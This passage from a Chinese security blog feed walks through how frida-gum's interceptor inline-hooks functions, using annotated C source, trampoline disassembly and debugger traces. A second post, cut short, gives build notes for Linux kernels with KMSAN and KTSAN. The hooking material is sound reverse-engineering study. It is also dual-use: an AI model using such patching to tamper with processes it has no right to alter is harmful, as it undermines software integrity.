ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h) // 跳回原函数，因为写跳转用了7字节，所以+7</span><br></pre></td></tr></table></figure><h6 id="gum-interceptor-transaction-end"><a href="#gum-interceptor-transaction-end" class="headerlink" title="gum_interceptor_transaction_end"></a>gum_interceptor_transaction_end</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前 transaction 添加到 任务中， 设置回调 函数 gum_interceptor_activate 拦截器激活函数</span></span><br><span class="line">  gum_interceptor_transaction_schedule_prologue_write (</span><br><span class="line">      &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拦截器激活</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_activate (GumInterceptor * self,</span><br><span class="line">                          GumFunctionContext * ctx,</span><br><span class="line">                          gpointer prologue)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ctx-&gt;destroyed)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  g_assert (!ctx-&gt;activated);</span><br><span class="line">  ctx-&gt;activated = TRUE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 激活</span></span><br><span class="line">  _gum_interceptor_backend_activate_trampoline (self-&gt;backend, ctx,</span><br><span class="line">      prologue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">_gum_interceptor_backend_activate_trampoline (GumInterceptorBackend * self,</span><br><span class="line">                                              GumFunctionContext * ctx,</span><br><span class="line">                                              gpointer prologue)</span><br><span class="line">&#123;</span><br><span class="line">  GumX86Writer * cw = &amp;self-&gt;writer;</span><br><span class="line">  guint padding;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置base</span></span><br><span class="line">  gum_x86_writer_reset (cw, prologue);</span><br><span class="line">  <span class="comment">// 设置pc</span></span><br><span class="line">  cw-&gt;pc = GPOINTER_TO_SIZE (ctx-&gt;function_address);</span><br><span class="line">  <span class="comment">// 写jmp， 跳转到 跳板中， 进入跳板这已经到hook里了</span></span><br><span class="line">  gum_x86_writer_put_jmp_address (cw, GUM_ADDRESS (ctx-&gt;on_enter_trampoline));</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpint (gum_x86_writer_offset (cw),</span><br><span class="line">      &lt;=, GUM_INTERCEPTOR_REDIRECT_CODE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 原本代码（hook点），剩余的地方nop补齐</span></span><br><span class="line">  padding = ctx-&gt;overwritten_prologue_len - gum_x86_writer_offset (cw);</span><br><span class="line">  <span class="keyword">for</span> (; padding != <span class="number">0</span>; padding--)</span><br><span class="line">    gum_x86_writer_put_nop (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-3-执行流程"><a href="#2-2-3-执行流程" class="headerlink" title="2.2.3 执行流程"></a>2.2.3 执行流程</h4><p>通过设置函数返回地址(<code>__gum_function_context_begin/end_invocation</code>)，控制流程，这就是ROP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C80204</span><br><span class="line">----------------------------------------------------</span><br><span class="line">`enter_chunk`  // 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️</span><br><span class="line">`__gum_function_context_begin_invocation` // 通过设置栈(ret addr)控制执行流程 </span><br><span class="line">----------------------------------------------------</span><br><span class="line">replacement_function</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C8020F</span><br><span class="line">----------------------------------------------------</span><br><span class="line">`leave_chunk`</span><br><span class="line">`__gum_function_context_end_invocation` </span><br><span class="line">----------------------------------------------------</span><br><span class="line">继续执行</span><br></pre></td></tr></table></figure><h2 id="0x03-调试分析帮助理解"><a href="#0x03-调试分析帮助理解" class="headerlink" title="0x03 : 调试分析帮助理解"></a>0x03 : 调试分析帮助理解</h2><p>这里调试了单元测试中写hook和函数替换的逻辑，过程如下：</p><p><code>_gum_interceptor_backend_create()</code></p><p>后端初始化，初始化两个thunk</p><p>enter_thunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00C30000  pushfd  </span><br><span class="line">00C30001  cld  </span><br><span class="line">00C30002  pushad  </span><br><span class="line">00C30003  lea         esp,[esp-4]  </span><br><span class="line">00C3000A  lea         eax,[esp+2Ch]  </span><br><span class="line">00C30011  mov         dword ptr [esp+10h],eax  </span><br><span class="line">00C30015  mov         ebx,dword ptr [esp+28h]  </span><br><span class="line">00C30019  mov         ebp,esp  </span><br><span class="line">00C3001B  and         esp,0FFFFFFF0h  </span><br><span class="line">00C30021  sub         esp,200h  </span><br><span class="line">00C30027  fxsave      [esp]  </span><br><span class="line">00C3002B  lea         esi,[ebp]  </span><br><span class="line">00C30031  lea         edx,[ebp+2Ch]  </span><br><span class="line">00C30037  lea         ecx,[ebp+28h]  </span><br><span class="line">00C3003D  push        ecx  </span><br><span class="line">00C3003E  push        edx  </span><br><span class="line">00C3003F  push        esi  </span><br><span class="line">00C30040  push        ebx  </span><br><span class="line">00C30041  call        __gum_function_context_begin_invocation (0CE8E1Fh)  </span><br><span class="line">00C30046  add         esp,10h  </span><br><span class="line">00C30049  fxrstor     [esp]  </span><br><span class="line">00C3004D  mov         esp,ebp  </span><br><span class="line">00C3004F  lea         esp,[esp+4]  </span><br><span class="line">00C30056  popad  </span><br><span class="line">00C30057  popfd  </span><br><span class="line">00C30058  ret</span><br></pre></td></tr></table></figure><p>leave_thunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00C30100  pushfd  </span><br><span class="line">00C30101  cld  </span><br><span class="line">00C30102  pushad  </span><br><span class="line">00C30103  lea         esp,[esp-4]  </span><br><span class="line">00C3010A  lea         eax,[esp+28h]  </span><br><span class="line">00C30111  mov         dword ptr [esp+10h],eax  </span><br><span class="line">00C30115  mov         ebx,dword ptr [esp+28h]  </span><br><span class="line">00C30119  mov         ebp,esp  </span><br><span class="line">00C3011B  and         esp,0FFFFFFF0h  </span><br><span class="line">00C30121  sub         esp,200h  </span><br><span class="line">00C30127  fxsave      [esp]  </span><br><span class="line">00C3012B  lea         esi,[ebp]  </span><br><span class="line">00C30131  lea         edx,[ebp+28h]  </span><br><span class="line">00C30137  sub         esp,4  </span><br><span class="line">00C3013A  push        edx  </span><br><span class="line">00C3013B  push        esi  </span><br><span class="line">00C3013C  push        ebx  </span><br><span class="line">00C3013D  call        __gum_function_context_end_invocation (0CEAB1Bh)  </span><br><span class="line">00C30142  add         esp,0Ch  </span><br><span class="line">00C30145  add         esp,4  </span><br><span class="line">00C30148  fxrstor     [esp]  </span><br><span class="line">00C3014C  mov         esp,ebp  </span><br><span class="line">00C3014E  lea         esp,[esp+4]  </span><br><span class="line">00C30155  popad  </span><br><span class="line">00C30156  popfd  </span><br><span class="line">00C30157  ret</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook 构造</span></span><br><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach (GumInterceptor * self,</span><br><span class="line">                        gpointer function_address,</span><br><span class="line">                        GumInvocationListener * listener,</span><br><span class="line">                        gpointer listener_function_data)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach (GumInterceptor * self,</span><br><span class="line">                        gpointer function_address,</span><br><span class="line">                        GumInvocationListener * listener,</span><br><span class="line">                        gpointer listener_function_data)</span><br><span class="line">&#123;</span><br><span class="line">  GumAttachReturn result = GUM_ATTACH_OK;</span><br><span class="line">  GumFunctionContext * function_ctx;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (gum_process_get_code_signing_policy () == GUM_CODE_SIGNING_REQUIRED)</span><br><span class="line">    <span class="keyword">goto</span> policy_violation;</span><br><span class="line"></span><br><span class="line">  gum_interceptor_ignore_current_thread (self);</span><br><span class="line">  GUM_INTERCEPTOR_LOCK (self);</span><br><span class="line">  gum_interceptor_transaction_begin (&amp;self-&gt;current_transaction);</span><br><span class="line">  self-&gt;current_transaction.is_dirty = TRUE;</span><br><span class="line">4</span><br><span class="line">  <span class="comment">// 获取hook目标函数的地址 </span></span><br><span class="line">  function_address = gum_interceptor_resolve (self, function_address);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取这个函数的 GumFunctionContext 对象</span></span><br><span class="line">  <span class="comment">// 没有就新建一个</span></span><br><span class="line">  <span class="comment">// 这里已经 准备好了跳板，写好了hook</span></span><br><span class="line">  <span class="comment">// 添加任务,设置相对应的回调函数</span></span><br><span class="line">  function_ctx = gum_interceptor_instrument (self, function_address);</span><br><span class="line">  <span class="keyword">if</span> (function_ctx == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">goto</span> wrong_signature;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (gum_function_context_has_listener (function_ctx, listener))</span><br><span class="line">    <span class="keyword">goto</span> already_attached;</span><br><span class="line">  <span class="comment">// 添加监听器</span></span><br><span class="line">  gum_function_context_add_listener (function_ctx, listener,</span><br><span class="line">      listener_function_data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">goto</span> beach;</span><br><span class="line"></span><br><span class="line">policy_violation:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> GUM_ATTACH_POLICY_VIOLATION;</span><br><span class="line">  &#125;</span><br><span class="line">wrong_signature:</span><br><span class="line">  &#123;</span><br><span class="line">    result = GUM_ATTACH_WRONG_SIGNATURE;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">already_attached:</span><br><span class="line">  &#123;</span><br><span class="line">    result = GUM_ATTACH_ALREADY_ATTACHED;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">beach:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 到这里，基本没什么问题，hook什么都打好了</span></span><br><span class="line">    <span class="comment">// 拦截器激活 跳板激活</span></span><br><span class="line">    <span class="comment">// 这里把原函数开头改写</span></span><br><span class="line">    gum_interceptor_transaction_end (&amp;self-&gt;current_transaction);</span><br><span class="line">    GUM_INTERCEPTOR_UNLOCK (self);</span><br><span class="line">    gum_interceptor_unignore_current_thread (self);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>on_invoke_trampoline 跳板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00C30200  mov         al,byte ptr ds:[FF00C121h]  </span><br><span class="line">00C30205  xor         eax,0C30200h  </span><br><span class="line">00C3020A  jmp         00C30000   // 跳到上面的 enter_thunk</span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  // 跳到 leave_thunk</span><br><span class="line">// 原函数修复的指令，7个字节</span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h) // 跳回原函数，因为写跳转用了7字节，所以+7</span><br></pre></td></tr></table></figure><p><code>gum_interceptor_transaction_end (&amp;self-&gt;current_transaction);</code> 调用 <code>gum_interceptor_activate()</code> 然后<code>_gum_interceptor_backend_activate_trampolie()</code> 随后，目标函数开头被修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gpointer GUM_NOINLINE</span><br><span class="line">gum_test_target_function (GString * str)</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">00</span>D6FB90  jmp         <span class="number">00</span>C30204  </span><br><span class="line">  <span class="keyword">if</span> (str != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">00</span>D6FB95  nop  </span><br><span class="line"><span class="number">00</span>D6FB96  nop  </span><br><span class="line"><span class="number">00</span>D6FB97  je          gum_test_target_function+<span class="number">19</span>h (<span class="number">0</span>D6FBA9h)</span><br></pre></td></tr></table></figure><p>直接跳转到 <code>00C30204</code>, 其实就是 跳板，因为反汇编的地址差了点，所以开始的指令不太一样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00C30204  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C3020A  jmp         00C30000  </span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  </span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h)  </span><br><span class="line">00C30226  add         byte ptr [eax],al  </span><br><span class="line">00C30228  add         byte ptr [eax],al  </span><br><span class="line">00C3022A  add         byte ptr [eax],al  </span><br><span class="line">00C3022C  add         byte ptr [eax],al  </span><br><span class="line">00C3022E  add         byte ptr [eax],al</span><br></pre></td></tr></table></figure><p>调用流程调试分析，这里分两个情况，是否存在``replacement_function`</p><p>首先是不存在，只是打个hook(根据 <code>TESTCASE(attach_one);</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">call 原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板</span><br><span class="line">----------------------------------------------------</span><br><span class="line">`enter_chunk`  // 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️</span><br><span class="line">`__gum_function_context_begin_invocation` // 通过设置栈(ret addr)控制执行流程 </span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板+n  (00C3021A) // 执行原函数的 修复的若干字节</span><br><span class="line">----------------------------------------------------</span><br><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">`leave_chunk` </span><br><span class="line">`__gum_function_context_end_invocation`</span><br><span class="line">----------------------------------------------------</span><br><span class="line">继续执行....</span><br></pre></td></tr></table></figure><p>存在替换的函数(<code>TESTCASE(replace_one);</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C80204</span><br><span class="line">----------------------------------------------------</span><br><span class="line">`enter_chunk`  // 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️</span><br><span class="line">`__gum_function_context_begin_invocation` // 通过设置栈(ret addr)控制执行流程 </span><br><span class="line">----------------------------------------------------</span><br><span class="line">replacement_function</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C8020F</span><br><span class="line">----------------------------------------------------</span><br><span class="line">`leave_chunk`</span><br><span class="line">`__gum_function_context_end_invocation` </span><br><span class="line">----------------------------------------------------</span><br><span class="line">继续执行</span><br></pre></td></tr></table></figure><p>replace_one 的跳板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">02C80204  push        dword ptr ds:[2C80200h]  </span><br><span class="line">02C8020A  jmp         02C80000  </span><br><span class="line">02C8020F  push        dword ptr ds:[2C80200h]  </span><br><span class="line">02C80215  jmp         02C80100  </span><br><span class="line">02C8021A  mov         edi,edi  </span><br><span class="line">02C8021C  push        ebp  </span><br><span class="line">02C8021D  mov         ebp,esp  </span><br><span class="line">02C8021F  jmp         malloc+5h (01E5A7B5h)</span><br></pre></td></tr></table></figure><h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 : 结语"></a>0x04 : 结语</h2><p>这个过程大概花了我一周 5天多的样子，挺难的个人感觉，需要捋清楚的话，配合调试会好很多，最开始我直接看的代码，看+做笔记，脑内debug，最后编译了工程，vs调试，清晰多了，还是建议边调试边看。</p><p>如果文中有任何问题，欢迎批评指正  : ) </p><p>后面可能会在他基础上做点事情吧…这框架真牛逼 !</p><h2 id="0x05-参考与引用"><a href="#0x05-参考与引用" class="headerlink" title="0x05 : 参考与引用"></a>0x05 : 参考与引用</h2><p><a href="https://jmpews.github.io/2017/06/27/pwn/frida-gum源码解读/" target="_blank" rel="noopener"><a href="https://jmpews.github.io/2017/06/27/pwn/frida-gum源码解读/" target="_blank" rel="noopener">rida-gum源码解读</a></a></p><p><a href="https://blog.csdn.net/yanbixing123/article/details/52970804" target="_blank" rel="noopener">gobject c语言</a></p><p><a href="https://bbs.pediy.com/thread-220794.htm" target="_blank" rel="noopener">如何构建一款像 frida 一样的框架</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言与预备知识&quot;&gt;&lt;a href=&quot;#0x00-前言与预备知识&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 前言与预备知识&quot;&gt;&lt;/a&gt;0x00 : 前言与预备知识&lt;/h2&gt;&lt;p&gt;&lt;code&gt;frida&lt;/code&gt; :  frida是一个优秀的跨平台&lt;code&gt;Dynamic instrumentation toolkit&lt;/code&gt;，具体可以看&lt;a href=&quot;https://www.frida.re&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官网介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/linux/l-gobject/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GObject对象系统&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="frida" scheme="http://o0xmuhe.me/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>Linux Kernel 编译踩坑</title>
    <link href="http://o0xmuhe.me/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/"/>
    <id>http://o0xmuhe.me/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/</id>
    <published>2019-10-24T02:42:04.000Z</published>
    <updated>2019-11-23T13:26:16.521Z</updated>
    
    <content type="html"><![CDATA[<h2 id="env-config"><a href="#env-config" class="headerlink" title="env config"></a>env config</h2><p><code>ubuntu 18.04 amd64</code></p><a id="more"></a><h3 id="gcc-8"><a href="#gcc-8" class="headerlink" title="gcc-8"></a>gcc-8</h3><p>works on ubuntu 16.04 and 18.04</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r/<span class="built_in">test</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gcc-8 g++-8</span><br><span class="line">gcc-8 --version</span><br></pre></td></tr></table></figure><h3 id="clang"><a href="#clang" class="headerlink" title="clang"></a>clang</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">R=348261</span><br><span class="line">svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/llvm/trunk llvm</span><br><span class="line"><span class="built_in">cd</span> llvm</span><br><span class="line">(<span class="built_in">cd</span> tools &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/cfe/trunk clang)</span><br><span class="line">(<span class="built_in">cd</span> projects &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt)</span><br><span class="line">mkdir llvm_cmake_build &amp;&amp; <span class="built_in">cd</span> llvm_cmake_build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON ../</span><br><span class="line">make -j64 clang</span><br><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br></pre></td></tr></table></figure><p>文档里<code>-j64</code>真的奢华…</p><h3 id="qemu-kvm"><a href="#qemu-kvm" class="headerlink" title="qemu kvm"></a>qemu kvm</h3><p>这部分推荐手动编译最新版本/较新版本，直接apt安装的版本有点老，后面可能有影响。</p><p>基本没啥坑，就是耗时耗力 :(</p><h2 id="build-kernel"><a href="#build-kernel" class="headerlink" title="build kernel"></a>build kernel</h2><h3 id="mainline"><a href="#mainline" class="headerlink" title="mainline"></a>mainline</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure><h3 id="linux-next"><a href="#linux-next" class="headerlink" title="linux-next"></a>linux-next</h3><p>一样的编译过程，next只是代码比较激进的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure><h3 id="kmsan"><a href="#kmsan" class="headerlink" title="kmsan"></a>kmsan</h3><p>跟着readme走就行了</p><p>遇到一个坑点，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br><span class="line">...</span><br><span class="line">make CC=<span class="variable">$KMSAN_CLANG_PATH</span> -j64 -k 2&gt;&amp;1 | tee build.log</span><br></pre></td></tr></table></figure><p>直接这么编译有问题，试了几次都不行，提示说编译器不支持xxxx这类问题。<br>最后我尝试了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=/path/to/clang</span><br></pre></td></tr></table></figure><p>之后直接编译就没问题了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure><p>这个版本我后面弄了个更新版本的clang也可以直接编译过。</p><h3 id="ktsan"><a href="#ktsan" class="headerlink" title="ktsan"></a>ktsan</h3><p>编译没啥坑，就是注意<code>.config</code>文件别乱改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/ktsan.git</span><br><span class="line"><span class="built_in">cd</span> ktsan/</span><br><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br><span class="line">scripts/config -e KTSAN -e SLAB -d SLUB -e DEBUG_INFO</span><br><span class="line">yes <span class="string">''</span> | make oldconfig</span><br><span class="line">make -j2 LOCALVERSION=-tsan</span><br></pre></td></tr></table></figure><h2 id="run-kernel"><a href="#run-kernel" class="headerlink" title="run kernel"></a>run kernel</h2><p>创建文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">IMG=qemu-image.img</span><br><span class="line">DIR=mount-point.dir</span><br><span class="line">qemu-img create <span class="variable">$IMG</span> 10g</span><br><span class="line">mkfs.ext2 <span class="variable">$IMG</span></span><br><span class="line">mkdir 